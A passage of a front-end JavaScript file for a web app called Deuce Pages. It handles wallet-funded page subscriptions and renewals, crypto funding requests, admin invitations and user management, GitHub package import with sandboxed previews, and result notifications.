    window.location.hash = "#my-pages";
    window.setTimeout(() => {
      statusText.textContent = isAdmin()
        ? `${pagePackage.name.toUpperCase()} ADMIN SUBSCRIPTION ACTIVE`
        : `${pagePackage.name.toUpperCase()} ${billingLabel(period).toUpperCase()} SUBSCRIPTION ACTIVE`;
    }, 50);
  } catch (error) {
    button.disabled = false;
    button.textContent = originalLabel;
    if (error.status === 402) {
      if (isAdmin()) {
        statusText.textContent = "ADMIN FREE ACCESS NOT ACTIVE ON API. RESTART SERVER AND TRY AGAIN";
        return;
      }
      const required = formatMoney(error.data?.price || price);
      const balance = formatMoney(error.data?.walletBalance || walletData.balance || 0);
      statusText.textContent = `WALLET TOO LOW: ${balance} AVAILABLE, ${required} REQUIRED`;
      window.setTimeout(() => {
        window.location.hash = "#wallet";
      }, 700);
      return;
    }
    if (error.status === 401) {
      window.location.hash = "#login";
      statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
      return;
    }
    if (error.status === 409) {
      await loadAppData();
      window.location.hash = "#my-pages";
      const existing = error.data?.userPage || error.data?.existingUserPage;
      const action = error.data?.action === "renew" ? "RENEW FROM MY PAGES" : "OPEN IT FROM MY PAGES";
      statusText.textContent = existing?.name
        ? `${existing.name.toUpperCase()} ALREADY SUBSCRIBED. ${action}`
        : `PAGE ALREADY SUBSCRIBED. ${action}`;
      return;
    }
    statusText.textContent = `SUBSCRIPTION FAILED: ${error.message}`.toUpperCase();
  }
}

async function renewPageFromWallet(page) {
  if (!page) {
    statusText.textContent = "PAGE RECORD NOT FOUND";
    return;
  }
  if (!isLoggedIn()) {
    window.location.hash = "#login";
    statusText.textContent = "LOGIN REQUIRED TO RENEW";
    return;
  }

  try {
    const result = await requestApi(`/api/user-pages/${page.id}/renew`, { method: "POST" });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
    if (typeof result.walletBalance === "number") walletData.balance = result.walletBalance;
    await loadAppData();
    renderMyPages();
    statusText.textContent = `${updated.name.toUpperCase()} RENEWED`;
  } catch (error) {
    if (error.status === 402) {
      const required = formatMoney(error.data?.price || page.subscription?.renewalPrice || 0);
      const balance = formatMoney(error.data?.walletBalance || walletData.balance || 0);
      statusText.textContent = `WALLET TOO LOW: ${balance} AVAILABLE, ${required} REQUIRED`;
      window.setTimeout(() => {
        window.location.hash = "#wallet";
      }, 700);
      return;
    }
    if (error.status === 401) {
      window.location.hash = "#login";
      statusText.textContent = "LOGIN REQUIRED TO RENEW";
      return;
    }
    statusText.textContent = `RENEWAL FAILED: ${error.message}`.toUpperCase();
  }
}

async function submitWalletFundRequest() {
  const field = (name) => preview.querySelector(`[data-wallet-fund="${name}"]`)?.value.trim() || "";
  const selected = walletFundingOptionByValue(field("crypto"));
  const payload = {
    amount: field("amount"),
    cryptoType: selected.asset,
    network: selected.network,
    txHash: field("txHash")
  };
  if (!payload.amount || Number(payload.amount) < minimumWalletFundingUsd) {
    statusText.textContent = `MINIMUM FUNDING IS ${formatMoney(minimumWalletFundingUsd)}`;
    setWalletQuoteState("error", `Minimum funding is ${formatMoney(minimumWalletFundingUsd)}.`);
    return;
  }
  if (!selected.address) {
    statusText.textContent = `${selected.label.toUpperCase()} RECEIVING ADDRESS NOT SET`;
    return;
  }
  if (!payload.txHash || payload.txHash.length < 8) {
    statusText.textContent = "TRANSACTION HASH REQUIRED";
    return;
  }
  try {
    await requestApi("/api/wallet/fund-request", {
      method: "POST",
      body: JSON.stringify(payload)
    });
    walletFundOpen = false;
    await loadAppData();
    renderWallet();
    statusText.textContent = "FUNDING REQUEST SUBMITTED";
  } catch (error) {
    if (error.status === 401) {
      window.location.hash = "#login";
      return;
    }
    statusText.textContent = `FUNDING FAILED: ${error.message}`.toUpperCase();
  }
}

async function approveWalletFundRequest(button) {
  const requestId = button.dataset.approveWalletFund;
  if (!requestId) return;
  const adminNote = preview.querySelector(`[data-fund-admin-note="${requestId}"]`)?.value.trim() || "";
  try {
    await requestApi(`/api/wallet/admin/fund-requests/${encodeURIComponent(requestId)}/approve`, {
      method: "POST",
      body: JSON.stringify({ adminNote })
    });
    await loadAppData();
    renderAdminUsers();
    statusText.textContent = "WALLET CREDIT APPROVED";
  } catch (error) {
    statusText.textContent = `APPROVAL FAILED: ${error.message}`.toUpperCase();
  }
}

async function updateWalletFundReview(button, action) {
  const requestId = button.dataset.reviewWalletFund || button.dataset.rejectWalletFund;
  if (!requestId) return;
  const adminNote = preview.querySelector(`[data-fund-admin-note="${requestId}"]`)?.value.trim() || "";
  try {
    await requestApi(`/api/wallet/admin/fund-requests/${encodeURIComponent(requestId)}/${action}`, {
      method: "POST",
      body: JSON.stringify({ adminNote })
    });
    await loadAppData();
    renderAdminUsers();
    statusText.textContent = action === "reject" ? "FUNDING REQUEST REJECTED" : "FUNDING REQUEST MARKED REVIEWING";
  } catch (error) {
    statusText.textContent = `FUNDING UPDATE FAILED: ${error.message}`.toUpperCase();
  }
}

function invitationTime(value) {
  const date = new Date(value);
  return Number.isNaN(date.getTime()) ? "Unknown" : date.toLocaleString();
}

function invitationLink(token) {
  return `${apiBase().replace(/\/$/, "")}/invite#invite=${encodeURIComponent(token)}`;
}

async function createAdminInvitation() {
  const email = preview.querySelector("[data-invite-email]")?.value.trim() || "";
  const expiresInHours = Number(preview.querySelector("[data-invite-hours]")?.value || 48);
  if (!email) {
    statusText.textContent = "INVITATION EMAIL REQUIRED";
    return;
  }

  const result = await requestApi("/api/admin/invites", {
    method: "POST",
    body: JSON.stringify({ email, expiresInHours })
  });
  latestInvitationLink = {
    email: result.invitation.email,
    link: invitationLink(result.token),
    expiresAt: result.invitation.expiresAt
  };
  const invitationList = await requestApi("/api/admin/invites").catch(() => ({
    invitations: [result.invitation, ...adminInvitations.filter((invitation) => invitation.id !== result.invitation.id)]
  }));
  adminInvitations = invitationList.invitations || [];
  renderAdminUsers();
  statusText.textContent = "INVITATION CREATED / COPY OR EMAIL THE LINK";
}

async function copyLatestInvitation() {
  if (!latestInvitationLink?.link) throw new Error("Create an invitation first");
  await navigator.clipboard.writeText(latestInvitationLink.link);
  statusText.textContent = "INVITATION LINK COPIED";
}

function emailLatestInvitation() {
  if (!latestInvitationLink?.link) throw new Error("Create an invitation first");
  const subject = encodeURIComponent("Your Deuce Pages invitation");
  const body = encodeURIComponent(`You have been invited to Deuce Pages.

Create your account using this one-time link:
${latestInvitationLink.link}

The link expires ${invitationTime(latestInvitationLink.expiresAt)} and becomes unusable immediately after successful signup.`);
  window.location.href = `mailto:${encodeURIComponent(latestInvitationLink.email)}?subject=${subject}&body=${body}`;
}

async function revokeAdminInvitation(invitationId) {
  const result = await requestApi(`/api/admin/invites/${encodeURIComponent(invitationId)}`, { method: "DELETE" });
  adminInvitations = adminInvitations.map((invitation) => invitation.id === result.invitation.id ? result.invitation : invitation);
  if (latestInvitationLink && result.invitation.email === latestInvitationLink.email) latestInvitationLink = null;
  renderAdminUsers();
  statusText.textContent = "INVITATION REVOKED";
}

async function refreshAdminUsers() {
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = "ADMIN USERS REFRESHED";
}

async function saveAdminUserAccess(userId) {
  const user = adminUserById(userId);
  const role = preview.querySelector(`[data-admin-user-field="role"][data-admin-user="${userId}"]`)?.value || user?.role || "subscriber";
  const status = preview.querySelector(`[data-admin-user-field="status"][data-admin-user="${userId}"]`)?.value || user?.status || "active";
  const collabFields = [...preview.querySelectorAll(`[data-admin-collab="${userId}"]`)];
  const collabNote = preview.querySelector(`[data-admin-collab-note="${userId}"]`)?.value.trim() || "";
  const payload = { role, status };
  if (collabFields.length) {
    payload.collaboration = collabFields.reduce((collaboration, field) => ({
      ...collaboration,
      [field.dataset.adminCollabField]: field.checked
    }), { note: collabNote });
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}`, {
    method: "PATCH",
    body: JSON.stringify(payload)
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = collabFields.length ? "USER COLLABS UPDATED" : "USER ACCESS UPDATED";
}

async function adjustAdminUserWallet(userId, mode) {
  const amountField = preview.querySelector(`[data-admin-wallet-amount="${userId}"]`);
  const note = preview.querySelector(`[data-admin-wallet-note="${userId}"]`)?.value.trim() || "";
  const amount = Number(amountField?.value || 0);
  if (!Number.isFinite(amount) || amount <= 0) {
    statusText.textContent = "WALLET AMOUNT REQUIRED";
    return;
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}/wallet`, {
    method: "POST",
    body: JSON.stringify({
      amount: mode === "debit" ? -amount : amount,
      description: note || `Admin ${mode}`
    })
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = `USER WALLET ${mode === "debit" ? "DEBITED" : "CREDITED"}`;
}

async function extendAdminUserPage(userId) {
  const pageId = preview.querySelector(`[data-admin-page-select="${userId}"]`)?.value || "";
  const days = Number(preview.querySelector(`[data-admin-page-days="${userId}"]`)?.value || 0);
  const adminFreeSubscription = Boolean(preview.querySelector(`[data-admin-page-free="${userId}"]`)?.checked);
  const autoRenew = Boolean(preview.querySelector(`[data-admin-page-autorenew="${userId}"]`)?.checked);
  if (!pageId) {
    statusText.textContent = "SELECT A USER PAGE";
    return;
  }
  if (!Number.isFinite(days) || days <= 0) {
    statusText.textContent = "EXTEND DAYS REQUIRED";
    return;
  }
  await requestApi(`/api/admin/users/${encodeURIComponent(userId)}/pages/${encodeURIComponent(pageId)}/extend`, {
    method: "POST",
    body: JSON.stringify({ days, adminFreeSubscription, autoRenew, status: "active" })
  });
  await loadAppData();
  renderAdminUsers();
  statusText.textContent = "USER PAGE EXTENDED";
}

function renderGithubImportResult(scan, pagePackage) {
  const resultPanel = preview.querySelector("[data-github-result]");
  if (!resultPanel) return;
  const htmlScreens = scan.screens || [];
  const cssFiles = scan.cssFiles || [];
  const assets = scan.assets || [];
  const review = scan.review || { status: "review", checks: [], issues: [], warnings: [] };
  const firstPreviewUrl = htmlScreens[0] ? githubPreviewUrl(scan, htmlScreens[0].file) : "";
  const previewReady = Boolean(pagePackage?.previewAvailable);
  const editorHash = pagePackage?.slug ? `#admin-package-${pagePackage.slug}` : "";

  resultPanel.innerHTML = `
    <code>${pagePackage ? `${pagePackage.status === "published" ? "Published" : "Draft"} package ready: ${pagePackage.name} (${pagePackage.slug})` : `Connected: ${scan.owner}/${scan.repo}`}</code>
    <code>Branch: ${scan.branch}${scan.folder ? ` / folder: ${scan.folder}` : ""}</code>
    <code>Live source: mutable branch / commit ${escapeHtml(shortCommit(scan.commitSha))} / ${scan.summary.excludedFiles || 0} private or unsupported files excluded</code>
    <code>Files: ${scan.summary.totalFiles} total / ${scan.summary.html} HTML / ${scan.summary.css} CSS / ${scan.summary.assets} assets</code>
    <div class="import-review-list">
      ${(review.checks || []).map((check) => `
        <span class="is-${escapeHtml(check.status)}">
          <strong>${escapeHtml(check.label)}</strong>
          <em>${escapeHtml(check.detail)}</em>
        </span>
      `).join("")}
    </div>
    ${(review.issues || []).length ? `
      <div class="import-alert is-blocked">
        ${(review.issues || []).map((issue) => `<code>${escapeHtml(issue)}</code>`).join("")}
      </div>
    ` : ""}
    ${(review.warnings || []).length ? `
      <div class="import-alert">
        ${(review.warnings || []).map((warning) => `<code>${escapeHtml(warning)}</code>`).join("")}
      </div>
    ` : ""}
    ${pagePackage ? `
      <div class="import-result-actions">
        ${previewReady ? `<button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button>` : ""}
        ${editorHash ? `<button type="button" data-route="${escapeHtml(editorHash)}">Map screens & publish</button>` : ""}
      </div>
    ` : ""}
    <div class="github-preview-panel">
      <div>
        <strong>Screen preview</strong>
        ${htmlScreens.length ? htmlScreens.map((screen, index) => `
          <button type="button" data-github-preview-url="${escapeHtml(githubPreviewUrl(scan, screen.file))}" data-github-raw-url="${escapeHtml(githubFileUrl(scan, screen.file, "raw"))}" data-github-preview-name="${escapeHtml(screen.buttonLabel || screen.name || screen.file)}">
            ${String(index + 1).padStart(2, "0")} ${escapeHtml(screen.buttonLabel || screen.name || screen.file)} - ${escapeHtml(screen.file)}
          </button>
        `).join("") : "<span>No HTML screens found yet.</span>"}
      </div>
      <div>
        <strong>CSS and assets</strong>
        <span>${cssFiles.length ? cssFiles.map((file) => escapeHtml(file)).join(" / ") : "No CSS files detected"}</span>
        <span>${assets.length} asset files detected</span>
      </div>
    </div>
    ${firstPreviewUrl ? `
      <div class="github-iframe-shell">
        <div>
          <strong data-github-preview-title>Previewing ${escapeHtml(htmlScreens[0].buttonLabel || htmlScreens[0].name || htmlScreens[0].file)}</strong>
          <a href="${escapeHtml(githubFileUrl(scan, htmlScreens[0].file, "raw"))}" target="_blank" rel="noopener" data-github-preview-open>Open raw</a>
        </div>
        <iframe title="GitHub page preview" src="${escapeHtml(firstPreviewUrl)}" data-github-preview-frame sandbox="allow-scripts" referrerpolicy="no-referrer"></iframe>
      </div>
    ` : ""}
    <code>Create the draft, map its screens, preview it, then publish from the package editor.</code>
  `;
}

async function scanGithubImport(mode = "scan", triggerButton = null) {
  const createPackageRecord = mode === "draft" || mode === "publish";
  const payload = {
    ...collectGithubImportFields(),
    publish: mode === "publish"
  };
  const endpoint = createPackageRecord ? "/api/admin/import/github/package" : "/api/admin/import/github/scan";
  const resultPanel = preview.querySelector("[data-github-result]");
  const originalLabel = triggerButton?.textContent || "";

  if (!payload.repoUrl) {
    if (resultPanel) {
      resultPanel.innerHTML = `<code>Repository URL is required.</code><code>Paste a GitHub repo URL, then scan again.</code>`;
    }
    statusText.textContent = "GITHUB REPOSITORY URL REQUIRED";
    return;
  }

  if (resultPanel) {
    resultPanel.innerHTML = `
      <code>Checking API connection...</code>
      <code>${escapeHtml(apiBase())}/api/health</code>
    `;
  }
  if (triggerButton) {
    triggerButton.disabled = true;
    triggerButton.textContent = "Checking API...";
  }
  statusText.textContent = "VERIFYING API CONNECTION";

  try {
    const connection = await checkAdminApiConnection();
    if (!connection.ok) {
      if (resultPanel) {
        resultPanel.innerHTML = `
          <code>${escapeHtml(connection.title)}</code>
          <code>${escapeHtml(connection.detail)}</code>
          <code>Backend connection is managed by the app.</code>
        `;
      }
      statusText.textContent = connection.status === 403 ? "ADMIN ACCESS REQUIRED" : "GITHUB IMPORT NEEDS API CONNECTION";
      if (connection.status === 401) window.location.hash = "#login";
      return;
    }

    if (resultPanel) {
      resultPanel.innerHTML = `
        <code>API online: ${escapeHtml(connection.health?.service || "deuce-pages-api")}</code>
        <code>Admin verified: ${escapeHtml(connection.user?.email || "current session")}</code>
        <code>Connecting to GitHub: ${escapeHtml(payload.repoUrl)}</code>
      `;
    }
    if (triggerButton) {
      triggerButton.textContent = mode === "publish" ? "Publishing..." : createPackageRecord ? "Creating..." : "Scanning...";
    }
    statusText.textContent = mode === "publish" ? "IMPORTING AND PUBLISHING PACKAGE" : createPackageRecord ? "CREATING GITHUB PACKAGE DRAFT" : "SCANNING GITHUB REPOSITORY";

    const result = await requestApi(endpoint, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    renderGithubImportResult(result.scan, result.package);
    if (result.package) await loadAppData();
    statusText.textContent = mode === "publish" ? "GITHUB PACKAGE PUBLISHED" : createPackageRecord ? "GITHUB PACKAGE DRAFT CREATED" : "GITHUB REPOSITORY SCANNED";
  } catch (error) {
    if (resultPanel) {
      if (error.data?.scan) {
        renderGithubImportResult(error.data.scan, null);
        resultPanel.insertAdjacentHTML("afterbegin", `
          <code>GitHub import stopped: ${escapeHtml(error.message)}</code>
        `);
      } else {
        resultPanel.innerHTML = `
          <code>GitHub import failed</code>
          <code>${escapeHtml(error.message)}</code>
          <code>Private repos need valid GitHub access. Public repos need the correct branch and folder.</code>
        `;
      }
    }
    statusText.textContent = error.status === 401
      ? "LOGIN REQUIRED"
      : error.status === 403
        ? "ADMIN ACCESS REQUIRED"
        : error.status === 0
          ? "GITHUB IMPORT NEEDS API CONNECTION"
          : "GITHUB IMPORT FAILED";
  } finally {
    if (triggerButton) {
      triggerButton.disabled = false;
      triggerButton.textContent = originalLabel;
    }
  }
}

renderButtons();
applyAppearancePreference();
async function initApp() {
  try {
    localStorage.removeItem("deuceAuthState");
  } catch {
    // Ignore disabled storage; the authenticated session lives only in the HttpOnly cookie.
  }
  setAppBusy(true, "Loading workspace");
  try {
    syncAdminVisibility();
    await refreshAuthUser();
    await loadAppData();
    await refreshNotifications({ silent: true });
    startNotificationPolling();
    syncAdminVisibility();
    await renderRoute();
  } finally {
    initialBootActive = false;
    setAppBusy(false);
  }
}

initApp();

document.addEventListener("pointerdown", () => {
  const AudioContextType = window.AudioContext || window.webkitAudioContext;
  if (!AudioContextType) return;
  try {
    resultNotificationAudioContext ||= new AudioContextType();
    if (resultNotificationAudioContext.state === "suspended") resultNotificationAudioContext.resume().catch(() => {});
  } catch {
    // Sound remains optional when the browser blocks audio initialization.
  }
}, { once: true });

notificationToggle?.addEventListener("click", () => {
  const willOpen = notificationPanel?.hidden !== false;
  if (notificationPanel) notificationPanel.hidden = !willOpen;
  notificationToggle.setAttribute("aria-expanded", willOpen ? "true" : "false");
  if (willOpen) refreshNotifications({ silent: true });
});

notificationCenter?.addEventListener("click", async (event) => {
  const readAll = event.target.closest("[data-notification-read-all]");
  if (readAll) {
    await requestApi("/api/notifications/read-all", { method: "PATCH" });
    notificationItems = notificationItems.map((notification) => ({ ...notification, readAt: notification.readAt || new Date().toISOString() }));
    notificationUnreadCount = 0;
    renderNotificationCenter();
    return;
  }
  const item = event.target.closest("[data-notification-open]");
  if (!item) return;
  const notification = notificationItems.find((entry) => entry.id === item.dataset.notificationOpen);
  if (notification && !notification.readAt) {
    await requestApi(`/api/notifications/${encodeURIComponent(notification.id)}/read`, { method: "PATCH" });
    notification.readAt = new Date().toISOString();
    notificationUnreadCount = Math.max(0, notificationUnreadCount - 1);
    renderNotificationCenter();
  }
  if (notificationPanel) notificationPanel.hidden = true;
  notificationToggle?.setAttribute("aria-expanded", "false");
  const pageKey = notificationPageKey(notification || { userPageId: item.dataset.notificationPage });
  if (!pageKey) {
    statusText.textContent = "RESULT NOTIFICATION HAS NO PAGE RECORD";
    return;
  }
  let resultPage = getPageBySlug(pageKey);
  if (!resultPage && notification?.userPageId) {
    try {
      const response = await requestApi(`/api/user-pages/${encodeURIComponent(notification.userPageId)}`);
      resultPage = normalizeUserPage(response.userPage);
      ownedPages = [...ownedPages.filter((page) => page.id !== resultPage.id), resultPage];
    } catch (error) {
      statusText.textContent = `RESULT PAGE LOAD FAILED: ${error.message}`.toUpperCase();
      return;
    }
  }
  if (!resultPage) {
    statusText.textContent = "RESULT PAGE RECORD NOT FOUND";
    return;
  }
  window.location.hash = `#results-${pageRouteKey(resultPage)}`;
});

window.addEventListener("hashchange", () => {
  closeResultViewer({ restoreFocus: false });
  renderRoute();
});

preview.addEventListener("change", (event) => {
  const resultSelection = event.target.closest("[data-result-select]");
  if (resultSelection) {
    updateBulkResultsToolbar();
    updateResultsAutoRefreshStatus();
    return;
  }

  const packageFilter = event.target.closest("[data-admin-package-filter]");
  if (packageFilter) {
    adminPackageLibraryState[packageFilter.dataset.adminPackageFilter] = packageFilter.value;
    renderAdminPackages();
    return;
  }

  const packageThumbnailInput = event.target.closest("[data-package-thumbnail]");
  if (packageThumbnailInput) {
    uploadPackageThumbnail(packageThumbnailInput);
    return;
  }

  const marketPlanSelect = event.target.closest("[data-market-plan]");
  if (marketPlanSelect) {
    updateMarketPlanCard(marketPlanSelect);
    return;
  }

  const walletCryptoSelect = event.target.closest('[data-wallet-fund="crypto"]');
  if (walletCryptoSelect) {
    updateWalletFundingAddress(walletCryptoSelect);
    return;
  }

  const adminPageSelect = event.target.closest("[data-admin-page-select]");
  if (adminPageSelect) {
    syncAdminPageToggleFields(adminPageSelect);
    return;
  }
});

preview.addEventListener("input", (event) => {
  const packageSearch = event.target.closest("[data-admin-package-search]");
  if (packageSearch) {
    adminPackageLibraryState.search = packageSearch.value;
    renderAdminPackages();
    preview.querySelector("[data-admin-package-search]")?.focus();
    return;
  }
  if (event.target.closest("[data-session-search-input]")) {
    applyCompactSessionFilters();
    updateResultsAutoRefreshStatus("interaction");
  }
  if (event.target.closest('[data-wallet-fund="amount"]')) {
    scheduleWalletFundingQuote();
  }
});

preview.addEventListener("click", async (event) => {
  const clickedButton = event.target.closest("button");
  pulseButton(clickedButton);

  const logoutButton = event.target.closest("[data-logout]");
  if (logoutButton) {
    await withButtonBusy(logoutButton, "Signing out", handleLogout);
    return;
  }

  const routeButton = event.target.closest("[data-route]");
  if (routeButton) {
    setAppBusy(true, "Opening view");
    if (window.location.hash === routeButton.dataset.route) {
      await renderRoute();
      clearAppBusySoon();
    } else {
      window.location.hash = routeButton.dataset.route;
    }
    return;
  }

  const loginSubmitButton = event.target.closest("[data-login-submit]");
  if (loginSubmitButton) {
    await withButtonBusy(loginSubmitButton, "Signing in", handleLogin);
    return;
  }

  const signupSubmitButton = event.target.closest("[data-signup-submit]");
  if (signupSubmitButton) {
    await withButtonBusy(signupSubmitButton, "Creating", handleSignup);
    return;
  }
  const createInviteButton = event.target.closest("[data-create-admin-invite]");
  if (createInviteButton) {
    try {
      await withButtonBusy(createInviteButton, "Creating", createAdminInvitation);
    } catch (error) {
      statusText.textContent = `INVITATION FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const copyInviteButton = event.target.closest("[data-copy-admin-invite]");
  if (copyInviteButton) {
    try {
      await withButtonBusy(copyInviteButton, "Copying", copyLatestInvitation);
    } catch (error) {
      statusText.textContent = `COPY FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const emailInviteButton = event.target.closest("[data-email-admin-invite]");
  if (emailInviteButton) {
    try {
      emailLatestInvitation();
      statusText.textContent = "INVITATION EMAIL DRAFT OPENED";
    } catch (error) {
      statusText.textContent = `EMAIL DRAFT FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const revokeInviteButton = event.target.closest("[data-revoke-admin-invite]");
  if (revokeInviteButton) {
    if (!window.confirm("Revoke this invitation link? It will stop working immediately.")) return;
    try {
      await withButtonBusy(revokeInviteButton, "Revoking", () => revokeAdminInvitation(revokeInviteButton.dataset.revokeAdminInvite));
    } catch (error) {
      statusText.textContent = `REVOKE FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }


  const githubScanButton = event.target.closest("[data-github-scan]");
  if (githubScanButton) {
    await withButtonBusy(githubScanButton, "Scanning", () => scanGithubImport("scan", githubScanButton));
    return;
  }

  const localImportButton = event.target.closest("[data-local-import]");
  if (localImportButton) {
    await withButtonBusy(localImportButton, "Uploading", () => uploadLocalPackage(localImportButton.dataset.localImport));
    return;
  }

  const githubImportButton = event.target.closest("[data-github-import]");
  if (githubImportButton) {
    await withButtonBusy(githubImportButton, "Creating", () => scanGithubImport("draft", githubImportButton));
    return;
  }

  const githubPublishButton = event.target.closest("[data-github-publish]");
  if (githubPublishButton) {
    await withButtonBusy(githubPublishButton, "Publishing", () => scanGithubImport("publish", githubPublishButton));
    return;
  }

  const marketPreviewButton = event.target.closest("[data-market-preview]");
  if (marketPreviewButton) {
    const pagePackage = marketPages.find((item) => item.slug === marketPreviewButton.dataset.marketPreview);
    try {
      await openPackagePreview(pagePackage);
      statusText.textContent = `${pagePackage.name.toUpperCase()} PREVIEW OPENED`;
    } catch (error) {
      statusText.textContent = `PREVIEW FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const marketSubscribeButton = event.target.closest("[data-market-subscribe]");
  if (marketSubscribeButton) {
    await withButtonBusy(marketSubscribeButton, "Subscribing", () => subscribeToMarketPackage(marketSubscribeButton));
    return;
  }

  const walletFundToggle = event.target.closest("[data-wallet-fund-toggle]");
  if (walletFundToggle) {
    walletFundOpen = !walletFundOpen;
    renderWallet();
    return;
  }

  const walletHistoryToggle = event.target.closest("[data-wallet-history-toggle]");
  if (walletHistoryToggle) {
    walletHistoryOpen = !walletHistoryOpen;
    renderWallet();
    return;
  }

  const walletFundSubmit = event.target.closest("[data-submit-wallet-fund]");
  if (walletFundSubmit) {
    await withButtonBusy(walletFundSubmit, "Submitting", submitWalletFundRequest);
    return;
  }

  const copyWalletAddressButton = event.target.closest("[data-copy-wallet-address]");
  if (copyWalletAddressButton) {
    const address = preview.querySelector("[data-wallet-address]")?.textContent.trim() || "";
    if (!address || address === "Receiving address not configured") {
      statusText.textContent = "RECEIVING ADDRESS NOT SET";
      return;
    }
    await withButtonBusy(copyWalletAddressButton, "Copying", () => navigator.clipboard.writeText(address));
    statusText.textContent = "WALLET ADDRESS COPIED";
    return;
  }

  const githubPreviewButton = event.target.closest("[data-github-preview-url]");
  if (githubPreviewButton) {
    const frame = preview.querySelector("[data-github-preview-frame]");
    const title = preview.querySelector("[data-github-preview-title]");
    const openLink = preview.querySelector("[data-github-preview-open]");
    const nextUrl = githubPreviewButton.dataset.githubPreviewUrl;
    const rawUrl = githubPreviewButton.dataset.githubRawUrl || nextUrl;
    if (frame && nextUrl) frame.src = nextUrl;
    if (title) title.textContent = `Previewing ${githubPreviewButton.dataset.githubPreviewName || "screen"}`;
    if (openLink && rawUrl) openLink.href = rawUrl;
    preview.querySelectorAll("[data-github-preview-url]").forEach((button) => button.classList.remove("active"));
    githubPreviewButton.classList.add("active");
    statusText.textContent = "GITHUB SCREEN PREVIEW UPDATED";
    return;
  }

  const screenMoveButton = event.target.closest("[data-package-screen-move]");
  if (screenMoveButton) {
    const row = screenMoveButton.closest("[data-package-screen-row]");
    const sibling = screenMoveButton.dataset.packageScreenMove === "up" ? row?.previousElementSibling : row?.nextElementSibling;
    if (row && sibling) {
      if (screenMoveButton.dataset.packageScreenMove === "up") row.parentElement.insertBefore(row, sibling);
      else row.parentElement.insertBefore(sibling, row);
      refreshImportedScreenOrder();
      statusText.textContent = "SCREEN ORDER CHANGED / SAVE DRAFT TO PERSIST";
    }
    return;
  }

  const screenRemoveButton = event.target.closest("[data-package-screen-remove]");
  if (screenRemoveButton) {
    const row = screenRemoveButton.closest("[data-package-screen-row]");
    if (row?.querySelector("[data-package-screen-final]")?.checked) {
      const noFinal = preview.querySelector("[data-package-screen-final-none]");
      if (noFinal) noFinal.checked = true;
    }
    row?.remove();
    refreshImportedScreenOrder();
    statusText.textContent = "MISSING SCREEN MAPPING REMOVED / SAVE DRAFT TO PERSIST";
    return;
  }

  const githubLiveCheckButton = event.target.closest("[data-github-live-check]");
  if (githubLiveCheckButton) {
    const page = getAdminPackage(githubLiveCheckButton.dataset.githubLiveCheck);
    await checkAdminPackageGitHub(page);
    statusText.textContent = githubLiveStatusByPackage.get(page?.id)?.error
      ? "GITHUB CHECK FAILED"
      : "GITHUB BRANCH CHECKED";
    return;
  }

  const githubLiveSyncButton = event.target.closest("[data-github-live-sync]");
  if (githubLiveSyncButton) {
    const page = getAdminPackage(githubLiveSyncButton.dataset.githubLiveSync);
    try {
      await withButtonBusy(githubLiveSyncButton, "Syncing", () => syncAdminPackageGitHub(page));
    } catch (error) {
      statusText.textContent = `GITHUB SYNC FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const saveAdminPackageButton = event.target.closest("[data-save-admin-package]");
  if (saveAdminPackageButton) {
    try {
      await withButtonBusy(saveAdminPackageButton, "Saving", () => saveAdminPackage(getAdminPackage(saveAdminPackageButton.dataset.saveAdminPackage)));
    } catch (error) {
      statusText.textContent = `PACKAGE SAVE FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const previewAdminPackageButton = event.target.closest("[data-admin-package-preview]");
  if (previewAdminPackageButton) {
    try { await openAdminPackagePreview(getAdminPackage(previewAdminPackageButton.dataset.adminPackagePreview)); }
    catch (error) { statusText.textContent = `PREVIEW FAILED: ${error.message}`.toUpperCase(); }
    return;
  }

  const publishAdminPackageButton = event.target.closest("[data-admin-package-publish]");
  if (publishAdminPackageButton) {
    try {
      await withButtonBusy(publishAdminPackageButton, "Publishing", () => publishAdminPackage(getAdminPackage(publishAdminPackageButton.dataset.adminPackagePublish)));
    } catch (error) {
      statusText.textContent = `PACKAGE PUBLISH FAILED: ${error.message}`.toUpperCase();
    }
    return;
  }

  const deletePackageButton = event.target.closest("[data-admin-package-delete]");
  if (deletePackageButton) {
    const page = getAdminPackage(deletePackageButton.dataset.adminPackageDelete);
    if (!page) throw new Error("Package not found");
    const confirmed = window.confirm(`Permanently delete ${page.name}? This removes its package record and R2 files and cannot be undone.`);
    if (!confirmed) return;
    await withButtonBusy(deletePackageButton, "Deleting", async () => {
      const result = await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}`, { method: "DELETE" });
      adminPackages = adminPackages.filter((item) => item.id !== page.id);
      marketPages = marketPages.filter((item) => item.id !== page.id);
      renderAdminPackages();
      statusText.textContent = `${page.name.toUpperCase()} DELETED / ${result.objectsDeleted || 0} R2 FILES REMOVED`;
    });
    return;
  }

  const packageStatusButton = event.target.closest("[data-admin-package-status]");
  if (packageStatusButton) {
    const page = getAdminPackage(packageStatusButton.dataset.adminPackageKey);
    await withButtonBusy(packageStatusButton, "Saving", async () => {
      if (!page) throw new Error("Package not found");
      if (packageStatusButton.dataset.adminPackageStatus === "archived" && !window.confirm(`Archive ${page.name}? New subscriptions will be blocked, but existing subscriber pages will remain active.`)) return;
      const result = await requestApi(`/api/admin/packages/${encodeURIComponent(page.id || page.slug)}`, {
        method: "PATCH",
        body: JSON.stringify({ status: packageStatusButton.dataset.adminPackageStatus })
      });
      const updated = normalizePackage(result.package);
      adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
      marketPages = adminPackages.filter((item) => item.status === "published");
      renderAdminPackages();
      statusText.textContent = `${updated.name.toUpperCase()} ${updated.status.toUpperCase()}`;
    });
    return;
  }

